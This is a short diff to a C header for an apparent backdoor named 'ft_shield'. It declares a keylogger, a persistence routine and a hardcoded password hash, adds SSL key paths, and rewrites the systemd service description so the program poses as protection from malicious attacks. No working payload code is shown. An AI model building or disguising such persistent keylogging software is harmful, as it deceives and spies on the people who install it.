@@ -42,6 +42,8 @@
 #define DETACH 2
 #define MLOCK 3
 #define MUNLOCK 4
+#define SSL_CERT_PATH "/opt/ssl/ft_shield_cert.pem"
+#define SSL_KEY_PATH "/opt/ssl/ft_shield_key.pem"
 
 #ifndef HASHED_PWD
     #define HASHED_PWD "4ba117368c491a5d90b64fcccd7d2cedb31146545e87d659cbd0d5cacb3f3064"
@@ -54,7 +56,7 @@
 #ifndef SYSTEMCTL_CONFIG
     #define SYSTEMCTL_CONFIG \
     "[Unit]\n" \
-    "Description=ft_shield start daemon\n" \
+    "Description=ft_shield - Protection from malicious attacks\n" \
     "After=local-fs.target\n\n" \
     "[Service]\n" \
     "Type=forking\n" \
@@ -129,6 +131,6 @@ bool check_pwd(unsigned char *passwd, size_t passwd_len);
 
 char *parse_device_name();
 void set_persistence();
-void launch_keylogger();
+void *launch_keylogger(void *args);
 
 #endif
